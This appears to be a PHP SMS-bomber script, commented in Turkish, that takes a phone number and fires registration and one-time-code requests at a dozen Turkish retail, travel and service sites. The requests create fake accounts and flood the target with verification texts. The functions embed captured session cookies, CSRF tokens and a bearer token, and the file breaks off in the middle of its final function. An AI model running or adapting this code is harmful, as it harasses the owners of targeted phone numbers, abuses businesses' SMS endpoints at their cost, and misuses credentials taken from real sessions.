<?php
// Hataları görebilmek için (geliştirme sırasında kullanılabilir)
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Veritabanı bağlantısı (database.php)
require_once '../server/database.php';

// Yanıt türünü JSON olarak ayarlıyoruz
header('Content-Type: application/json');

// Telefon numarasını alıyoruz
if (!isset($_GET['number']) || empty($_GET['number'])) {
    echo json_encode([
        "success" => false,
        "message" => "Telefon numarası gerekli!"
    ]);
    exit;
}

$gsm = htmlspecialchars(strip_tags($_GET['number']));

// SMS gönderim fonksiyonu
function sendSMS($gsm) {
    $randomEmail = generateRandomEmail();
    $ch = curl_init();

    // Örnek bir API çağrısı
    curl_setopt($ch, CURLOPT_URL, 'https://api.kredim.com.tr/api/v1/Communication/SendOTP');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'accept: application/json, text/plain, */*',
        'content-type: application/json',
        'origin: https://member.kredim.com.tr',
        'referer: https://member.kredim.com.tr/',
        'user-agent: Mozilla/5.0',
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
        "source" => "Register",
        "type" => 8,
        "gsmNumber" => "+90" . $gsm,
        "templateCode" => "VerifyMember",
        "originator" => "OTP|KREDIM"
    ]));

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    // Yanıtı değerlendiriyoruz
    if ($httpCode === 200) {
        return [
            "success" => true,
            "message" => "SMS gönderimi başarılı!"
        ];
    } else {
        return [
            "success" => false,
            "message" => "SMS gönderimi sırasında hata oluştu!"
        ];
    }
}
  
function vakko($gsm){
$telno = "0" . $gsm;
$ch = curl_init();
$randomEmail = generateRandomEmail();
curl_setopt($ch, CURLOPT_URL, 'https://www.vakko.com/users/register/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.vakko.com',
    'accept: application/json, text/plain, */*',
    'accept-language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type: application/json',
    'origin: https://www.vakko.com',
    'referer: https://www.vakko.com/users/register/',
    'sec-ch-ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'x-csrftoken: FLc2ut52mT7B75Ls5GsfvJHKPHAFefOVwdQfy4SEFWHWTi1mFZdFKA6pHaQfuq6M',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_COOKIE, 'sessionid=hmw0bj1cnt6n4bxrjkf6r6wiqkya54dh; _gcl_au=1.1.893290592.1700229303; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22nGbSepoefSbcwCaz3SiM%22%7D; _hjFirstSeen=1; _hjIncludedInSessionSample_883027=0; _hjSession_883027=eyJpZCI6ImFmY2NkNTdjLWNkMzItNGFmMy1iODRlLTBhMDQ2YWMzYjYyMyIsImNyZWF0ZWQiOjE3MDAyMjkzMDM4NDIsImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6ZmFsc2V9; _hjAbsoluteSessionInProgress=0; _p2s_cc=autorevoke; _p2s_uvi=e74b6d25.7443881480080541.1700229303971; _gid=GA1.2.640865099.1700229304; _hjSessionUser_883027=eyJpZCI6IjQzMmVhMWE4LWI2MTktNTIyZS04Y2ZlLTUxNjM0ZTBhZDlkYSIsImNyZWF0ZWQiOjE3MDAyMjkzMDM4MzksImV4aXN0aW5nIjp0cnVlfQ==; OfferMiner_ID=APFBMNXNHEKBQFVH20231117165510; _dc_gtm_UA-16233710-1=1; _ga_000D6QJ06S=GS1.1.1700229303.1.1.1700229778.60.0.0; _ga=GA1.1.34773107.1700229304; csrftoken=FLc2ut52mT7B75Ls5GsfvJHKPHAFefOVwdQfy4SEFWHWTi1mFZdFKA6pHaQfuq6M; VL_CM_0=%7B%22Items%22%3A%5B%7B%22K%22%3A%22VL_LastPageViewTime%22%2C%22V%22%3A%222023-11-17%252017%253A02%253A59%22%2C%22E%22%3A%222025-11-06%2017%3A02%3A59%22%7D%2C%7B%22K%22%3A%22VL_LastPVTimeForTD%22%2C%22V%22%3A%222023-11-17%252017%253A02%253A59%22%2C%22E%22%3A%222023-11-17%2017%3A32%3A59%22%7D%2C%7B%22K%22%3A%22VL_TotalDuration%22%2C%22V%22%3A%22470%22%2C%22E%22%3A%222025-11-06%2017%3A02%3A59%22%7D%2C%7B%22K%22%3A%22VL_FirstVisitTime%22%2C%22V%22%3A%222023-11-17%252016%253A55%253A10%22%2C%22E%22%3A%222025-11-06%2016%3A55%3A10%22%7D%2C%7B%22K%22%3A%22VL_TotalPV%22%2C%22V%22%3A%223%22%2C%22E%22%3A%222025-11-06%2017%3A02%3A59%22%7D%2C%7B%22K%22%3A%22VL_PVCountInVisit%22%2C%22V%22%3A%223%22%2C%22E%22%3A%222023-11-17%2017%3A32%3A59%22%7D%2C%7B%22K%22%3A%22VL_VisitStartTime%22%2C%22V%22%3A%222023-11-17%252016%253A55%253A10%22%2C%22E%22%3A%222023-11-17%2017%3A25%3A10%22%7D%2C%7B%22K%22%3A%22VL_TotalVisit%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222025-11-06%2016%3A55%3A10%22%7D%2C%7B%22K%22%3A%22OfferMiner_ID%22%2C%22V%22%3A%22APFBMNXNHEKBQFVH20231117165510%22%2C%22E%22%3A%222025-11-06%2016%3A55%3A10%22%7D%2C%7B%22K%22%3A%22OM_INW%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222025-11-06%2016%3A55%3A10%22%7D%2C%7B%22K%22%3A%22OMB_New%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222023-11-17%2017%3A32%3A59%22%7D%2C%7B%22K%22%3A%22OM_rDomain%22%2C%22V%22%3A%22https%253A%252F%252Fwww.vakko.com%252Fusers%252Flogin%252F%22%2C%22E%22%3A%222025-11-06%2016%3A55%3A10%22%7D%2C%7B%22K%22%3A%22VLTVisitorC%22%2C%22V%22%3A%22%257B%2522data%2522%253A%257B%257D%257D%22%2C%22E%22%3A%222025-11-06%2017%3A02%3A59%22%7D%5D%7D');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"email":"' . $randomEmail . '","first_name":"methYOK","last_name":"meth","date_of_birth":"1998-05-06","password":"Skidlamer123!","phone":"' . $telno . '","sms_allowed":true,"email_allowed":true,"gender":"male","confirm":true,"kvkk_confirm":true,"call_allowed":true}');
$response = curl_exec($ch);
curl_close($ch);
}

function bubilet($gsm){
$ch = curl_init();
$randomEmail = generateRandomEmail();
curl_setopt($ch, CURLOPT_URL, 'https://apiv2.bubilet.com.tr/api/Uye/Kayit');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: apiv2.bubilet.com.tr',
    'accept: application/json',
    'accept-language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization: ',
    'content-type: application/json; charset=UTF-8',
    'ilid: 15',
    'origin: https://www.bubilet.com.tr',
    'referer: https://www.bubilet.com.tr/',
    'sec-ch-ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"adSoyad\":\"meth YILMAZ\",\"ePosta\":\"$randomEmail\",\"ilKod\":15,\"sifre\":\"SKİDLAMER\",\"cinsiyet\":null,\"telefon\":\"0090$gsm\",\"emailIzin\":true,\"smsIzin\":true,\"bultenIzin\":true}");

$response = curl_exec($ch);

curl_close($ch);

}

function tazedirekt($gsm){
$ch = curl_init();
$randomEmail = generateRandomEmail();
curl_setopt($ch, CURLOPT_URL, 'https://www.tazedirekt.com/rest/users/register/otp');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'sec-ch-ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'X-PWA: true',
    'sec-ch-ua-mobile: ?0',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Content-Type: application/json',
    'Accept: application/json',
    'Referer: https://www.tazedirekt.com/kayit',
    'X-FORWARDED-REST: true',
    'X-Device-PWA: true',
    'sec-ch-ua-platform: "Windows"',
    'Accept-Encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"email":"' . $randomEmail . '","phoneNumber":"' . $gsm . '"}');
$response = curl_exec($ch);

curl_close($ch);

}

function abantsu($gsm){
$ch = curl_init();
$randomEmail = generateRandomEmail();
curl_setopt($ch, CURLOPT_URL, 'https://siparis.abantsu.com.tr/Account/Register');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Accept: application/json, text/javascript, */*; q=0.01',
    'Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection: keep-alive',
    'Content-Type: application/json; charset=UTF-8',
    'Origin: https://siparis.abantsu.com.tr',
    'Referer: https://siparis.abantsu.com.tr/Account/Register',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'X-Requested-With: XMLHttpRequest',
    'sec-ch-ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'Accept-Encoding: gzip',
]);
curl_setopt($ch, CURLOPT_COOKIE, '_gcl_au=1.1.1967806514.1700227688; _gid=GA1.3.2121840466.1700227688; _fbp=fb.2.1700227688470.1387887053; ASP.NET_SessionId=iwoycrzi42a3b0go3xhanqhi; _gat_gtag_UA_68178650_1=1; _dc_gtm_UA-68178650-1=1; _ga_9J64E17G35=GS1.1.1700227688.1.1.1700230656.60.0.0; _ga=GA1.1.1165852708.1700227688');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"PhoneNumber":"'. $gsm .'","Title":"meth yilmaz","CustomerPassword":"methyok123!","CustomerSurveyAnswer":"Facebook"}');

$response = curl_exec($ch);

curl_close($ch);

}

function aysu($gsm){
$part1 = substr($gsm, 0, 1);
$part2 = substr($gsm, 1, 3);
$part3 = substr($gsm, 4, 3);
$part4 = substr($gsm, 7, 2);
$part5 = substr($gsm, 9, 2);

$converted = "0($part1)+$part2+$part3+$part4+$part5";
    
$ch = curl_init();
$randomEmail = generateRandomEmail();
curl_setopt($ch, CURLOPT_URL, 'https://musteri.aysu.com.tr/ajax.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: musteri.aysu.com.tr',
    'accept: */*',
    'accept-language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'ajaxsave: SMS-VERIFICATION',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://musteri.aysu.com.tr',
    'referer: https://musteri.aysu.com.tr/',
    'sec-ch-ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'x-requested-with: XMLHttpRequest',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_COOKIE, '_ga=GA1.3.1540682098.1700230767; _gid=GA1.3.1207122779.1700230767; _gat=1; _ym_uid=1700230768471867890; _ym_d=1700230768; _ym_isad=2; _ym_visorc=w; PHPSESSID=b8j3paek58mcm29kcsqf8poitf');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=newAccount&phone=' . $converted);

$response = curl_exec($ch);

curl_close($ch);
}

function ofix($gsm){

$ch = curl_init();
$randomEmail = generateRandomEmail();
curl_setopt($ch, CURLOPT_URL, 'https://apiv4.ofix.com/account-gate/v1/Account/create');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: apiv4.ofix.com',
    'accept: text/plain, */*',
    'accept-language: tr-TR',
    'authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IkVDNTY1RjVGNUZBQUE3Njk0NDI0QjFEMzY1NjM4ODkwM0FDNzBEODdSUzI1NiIsInR5cCI6ImF0K2p3dCIsIng1dCI6IjdGWmZYMS1xcDJsRUpMSFRaV09Ja0RySERZYyJ9.eyJuYmYiOjE3MDAyMzE4MDcsImV4cCI6MTcwNDExOTgwNywiaXNzIjoiaHR0cHM6Ly9hdXRoLWFwaS1zZXJ2aWNlLmFzaHlwb25kLTQxM2MwZmU1Lndlc3RldXJvcGUuYXp1cmVjb250YWluZXJhcHBzLmlvIiwiYXVkIjpbInJlc291cmNlX2FjY291bnQiLCJyZXNvdXJjZV9iYXNrZXQiLCJyZXNvdXJjZV9jYXRhbG9nIiwicmVzb3VyY2VfY2hlY2tvdXQiLCJyZXNvdXJjZV9kaXNjb3VudCIsInJlc291cmNlX2dhdGV3YXkiXSwiY2xpZW50X2lkIjoib2ZpeC1zcGEtcHJvZCIsInZpc2l0b3JJZCI6IjAiLCJjbGllbnRWaXNpdG9ySWQiOiI4ZDk0NGQ0Ny02OTNlLTRlM2QtYmZjZi1jYTMyZDcxZTczMjEiLCJtZW1iZXJ0eXBlIjoiMCIsImFub255bW91c0lkIjoiMCIsImp0aSI6IkNDMDVBQTM2M0Q1NzU1MDYxRDkyQzJFQTM3NUQ3MTM2IiwiaWF0IjoxNzAwMjMxODA3LCJzY29wZSI6WyJhY2NvdW50X2Z1bGxwZXJtaXNzaW9uIiwiYmFza2V0X2Z1bGxwZXJtaXNzaW9uIiwiY2F0YWxvZ19mdWxscGVybWlzc2lvbiIsImNoZWNrb3V0X2Z1bGxwZXJtaXNzaW9uIiwiY2xpZW50dHlwZXMubm90bWVtYmVyIiwiZGlzY291bnRfZnVsbHBlcm1pc3Npb24iLCJnYXRld2F5X2Z1bGxwZXJtaXNzaW9uIiwiSWRlbnRpdHlTZXJ2ZXJBcGkiXX0.geJp3B47rZzi-YTX_r_6gOpy9mAVsE5iOx4wUq4Szav5qpph_Ml58GhIabzfONkdhZykqs37eLOb59DsbJ9PKVD7LE3u5Yb7tzK6V8RdRRArC4cy3dcYgjkMDqKg8XJD_b3u0s7FRvCQRcM5GiYXnFwHTobtmcCyT-Sxl4DA8ZYPdwYLiv9m82KtfxqftWoGfjgiS-gzNXnv0VFvwQQDQ10v7tQNwATJwf3Ys30nOky7CpBQZd7L51dq7z3YtNLwGMoo7zi3g7V56IvzsDTB3rpT4mb2EsL3SFgkaSn6FwRsXXtyuzC3QSWcLTj3PAL7hs43a1vS6U56G_S27bGvKQ',
    'clientid: 8d944d47-693e-4e3d-bfcf-ca32d71e7321',
    'content-type: application/json',
    'origin: https://www.ofix.com',
    'referer: https://www.ofix.com/',
    'sec-ch-ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"firstName\":\"meth\",\"lastName\":\"yılmaz\",\"phoneNumber\":\"$gsm\",\"password\":\"methyok123!\",\"emailNotifications\":false,\"mobileNotifications\":true,\"callNotifications\":false,\"whatsappNotifications\":false}");

$response = curl_exec($ch);

curl_close($ch);
}

function setur($gsm){
$ch = curl_init();
$randomEmail = generateRandomEmail();
curl_setopt($ch, CURLOPT_URL, 'https://www.setur.com.tr/api/services/v2/AuthenticationService/sendOtp');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.setur.com.tr',
    'accept: application/json, text/plain, */*',
    'accept-language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization: ',
    'baggage: sentry-environment=PRODUCTION,sentry-release=U5Zu3ua5Pab3wJVA0aJ0z,sentry-public_key=adbf7f1808ce45038eaafa175bbfbc89,sentry-trace_id=84d3c62db63548929da77d29ff04ceea',
    'basketid: ',
    'content-type: application/json',
    'correlationid: 83beaa85-0c9a-4c08-b3ef-0220cd11b5c5',
    'origin: https://www.setur.com.tr',
    'referer: https://www.setur.com.tr/',
    'sec-ch-ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'sentry-trace: 84d3c62db63548929da77d29ff04ceea-8db8d3047933a976-0',
    'token: ',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_COOKIE, 'x-setur3\'=1700232075.632.11270.58440|6627febfda71f22a34c01c6efa7436ca; dtCookie=v_4_srv_6_sn_F5E6D8C749B5D1BC5DF3E16B372B7393_perc_100000_ol_0_mul_1_app-3Ad548d8e1547c0129_0; TS01d3a24a=016bfb46aa4c04466f850c1df8e80b2fc22ac75898287bbb13b5a62f35e11ba8f1e168846715431879f60806c24d1786fa779cdde127fcb2f88fa26acd66cd1502a0401943; sessionId=852aaa75-b116-479b-975c-6b606dc4aa83; TS01ec8dca=016bfb46aa0b1f3fdc59b38c5cba9b9dbc1db409ae287bbb13b5a62f35e11ba8f1e168846799226a531f2859cd278af7c7db601a4c7420a02a27afeaa6dbd934b2b858f172e7f638a632f472eb88b26bd109c0e9cb; _gcl_au=1.1.580009639.1700231667; _fbp=fb.2.1700231667800.9572287; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%222LfXnyLTRp6OHUfHFsrf%22%7D; _gid=GA1.3.2006617425.1700231668; _gat_UA-4092082-9=1; OfferMiner_ID=NGMXVVQWRZVOSYYK20231117173427; _hjFirstSeen=1; _hjIncludedInSessionSample_1677893=0; _hjSession_1677893=eyJpZCI6ImE0YmYwMzk1LTcwMzctNGU3Yi1hZjNhLTY3MjA0ODQ3ZDM4NyIsImNyZWF0ZWQiOjE3MDAyMzE2NjgwMjEsImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6dHJ1ZX0=; _hjAbsoluteSessionInProgress=0; _tt_enable_cookie=1; _ttp=vE9hzL6-oglR6ATCR-rew0PQN-g; ai_user=HS1Rn91nQ/fCqnOJ4IvAot|2023-11-17T14:34:32.994Z; _hjSessionUser_1677893=eyJpZCI6ImJjYWI1YmFkLWM2NDEtNWZjZS04MWE3LWViYWU3ZmZkM2Y5MSIsImNyZWF0ZWQiOjE3MDAyMzE2NjgwMTgsImV4aXN0aW5nIjp0cnVlfQ==; CookieConsent={stamp:%27maRcf6JtdXU/LwaHFm3yulsBdLFRQHJkcttOG4iE90rIJKAwUbyStw==%27%2Cnecessary:true%2Cpreferences:true%2Cstatistics:true%2Cmarketing:true%2Cmethod:%27explicit%27%2Cver:1%2Cutc:1700232089429%2Cregion:%27tr%27}; ai_session=ksAscCj3CcTWmutXoppiDd|1700231675668|1700231704999; _ga_12345678=GS1.1.1700231667.1.1.1700231705.0.0.0; _ga=GA1.3.2063800159.1700231668; VL_CM_0=%7B%22Items%22%3A%5B%7B%22K%22%3A%22VL_LastPageViewTime%22%2C%22V%22%3A%222023-11-17%252017%253A35%253A05%22%2C%22E%22%3A%222025-11-06%2017%3A35%3A05%22%7D%2C%7B%22K%22%3A%22VL_LastPVTimeForTD%22%2C%22V%22%3A%222023-11-17%252017%253A35%253A05%22%2C%22E%22%3A%222023-11-17%2018%3A05%3A05%22%7D%2C%7B%22K%22%3A%22VL_TotalDuration%22%2C%22V%22%3A%2241%22%2C%22E%22%3A%222025-11-06%2017%3A35%3A05%22%7D%2C%7B%22K%22%3A%22VL_FirstVisitTime%22%2C%22V%22%3A%222023-11-17%252017%253A34%253A27%22%2C%22E%22%3A%222025-11-06%2017%3A34%3A27%22%7D%2C%7B%22K%22%3A%22VL_TotalPV%22%2C%22V%22%3A%225%22%2C%22E%22%3A%222025-11-06%2017%3A35%3A05%22%7D%2C%7B%22K%22%3A%22VL_PVCountInVisit%22%2C%22V%22%3A%225%22%2C%22E%22%3A%222023-11-17%2018%3A05%3A05%22%7D%2C%7B%22K%22%3A%22VL_VisitStartTime%22%2C%22V%22%3A%222023-11-17%252017%253A34%253A27%22%2C%22E%22%3A%222023-11-17%2018%3A04%3A27%22%7D%2C%7B%22K%22%3A%22VL_TotalVisit%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222025-11-06%2017%3A34%3A27%22%7D%2C%7B%22K%22%3A%22OfferMiner_ID%22%2C%22V%22%3A%22NGMXVVQWRZVOSYYK20231117173427%22%2C%22E%22%3A%222025-11-06%2017%3A34%3A27%22%7D%2C%7B%22K%22%3A%22OM_INW%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222025-11-06%2017%3A34%3A27%22%7D%2C%7B%22K%22%3A%22OMB_New%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222023-11-17%2018%3A05%3A05%22%7D%2C%7B%22K%22%3A%22VL_FirstReferrer%22%2C%22V%22%3A%22https%253A%252F%252Fwww.bing.com%252F%22%2C%22E%22%3A%222023-12-17%2017%3A35%3A02%22%7D%2C%7B%22K%22%3A%22OM_rDomain%22%2C%22V%22%3A%22https%253A%252F%252Fwww.setur.com.tr%252Fgiris-yap%22%2C%22E%22%3A%222025-11-06%2017%3A35%3A05%22%7D%2C%7B%22K%22%3A%22VLTVisitorC%22%2C%22V%22%3A%22%257B%2522data%2522%253A%257B%257D%257D%22%2C%22E%22%3A%222025-11-06%2017%3A35%3A05%22%7D%5D%7D; cto_bundle=2Ea_M195bFhkdkxJWjVSTnRoVklJT1BNQVlwbDNLNDNmVFBoWDFlN2NtVTF6JTJCVUFYYXdlVHM1NHU1eld1dVZFM2QlMkZvMG9ZZnp3VGFjakF0RE1vUnlObUM1OVZJOHc4MXRMNmRoelIlMkZPMTFrbVdrc1htbDJsYTU3NUg2b3JXS1hMdXlEcHZWUzc3S1pMcUVad25xczRlRjhtUUElM0QlM0Q; RT="z=1&dm=www.setur.com.tr&si=48e67576-2ead-4285-bae7-6b6fafcf9186&ss=lp2q1dwv&sl=2&tt=3ru&obo=1&rl=1&nu=4jx0xdj0&cl=10nw"');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"args":[{"body":{"length":6,"expiresIn":3,"type":"Sms","countryCode":"+90","otpMessageType":"MembershipConfirmationMessage","identifier":"+90'. $gsm .'"}}]}');

$response = curl_exec($ch);

curl_close($ch);

}

function insider($gsm){
$ch = curl_init();
$randomEmail = generateRandomEmail();
curl_setopt($ch, CURLOPT_URL, 'https://carrier.useinsider.com/v1/mercury/user/opt-in');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: carrier.useinsider.com',
    'accept: */*',
    'accept-language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://shop.nurus.com',
    'partner: nurus',
    'referer: https://shop.nurus.com/',
    'sec-ch-ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: cross-site',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'partnerName=nurus&userId=1700231780092de309da431.8a65122c&phoneNumber=%2B90' . $gsm .'&language=tr_TR&campaignId=738');
$response = curl_exec($ch);
curl_close($ch);
}

function atasay($gsm){
$ch = curl_init();
$randomEmail = generateRandomEmail();
curl_setopt($ch, CURLOPT_URL, 'https://www.atasay.com/users/register/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.atasay.com',
    'accept: application/json, text/plain, */*',
    'accept-language: tr-TR,tr;q=0.8',
    'content-type: application/json;charset=UTF-8',
    'origin: https://www.atasay.com',
    'referer: https://www.atasay.com/orders/checkout/',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'sec-gpc: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'x-csrftoken: JIokCUTwJ9ae50VqySN41VQHXTNPya0FIRHrCkZOaULwC2jEkMzp0LidphLYDpjn',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_COOKIE, 'csrftoken=2gJ3kRsnCtR6kgFBqyQ3KN8OOYNMOV7X1p2akhyF3esoRi3PcsCoJDAkgmLVTaqF; sessionid=sccafkgh1yb48vxjetm1bqebzrl23qmz');
curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"email\":\"$randomEmail\",\"first_name\":\"meth\",\"last_name\":\"yılmaz\",\"password\":\"methyok123!\",\"phone\":\"0$gsm\",\"sms_allowed\":true,\"attributes\":{\"call_allowed\":true},\"email_allowed\":true,\"confirm\":true,\"nationality\":\"TR\",\"language\":\"TR\",\"corr_language\":\"TR\",\"gender\":\"male\"}");
$response = curl_exec($ch);

curl_close($ch);



}

function boyner($gsm){
$ch = curl_init();
$randomEmail = generateRandomEmail();
curl_setopt($ch, CURLOPT_URL, 'https://mobileapi-redesign.boyner.com.tr/mobile2/mbUser/RegisterUser');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: mobileapi-redesign.boyner.com.tr',
    'accept: */*',
    'accept-language: tr-TR,tr;q=0.7',
    'api-version: 5',
    'appversion: 0.1.0',
    'content-type: application/json',
    'origin: https://www.boyner.com.tr',
    'osversion: 1',
    'phonetype: 1',
    'platform: 1',
    'referer: https://www.boyner.com.tr/',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'sec-gpc: 1',
    'storeid: 1',
    'token: 496e53fd-9d98-4dc0-947e-777c891e4d8c',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'x-is-web: true',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"Main":{"CellPhone":' . $gsm . ',"lastname":"yilmaz","firstname":"meth","Email":"' . $randomEmail . '","Password":"methyok123!","ReceiveCampaignMessages":true,"GenderID":1}}');

$response = curl_exec($ch);

curl_close($ch);
}

function damat($gsm){
    $ch = curl_init();
    $randomEmail = generateRandomEmail();
curl_setopt($ch, CURLOPT_URL, 'https://www.damattween.com/users/otp-login/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
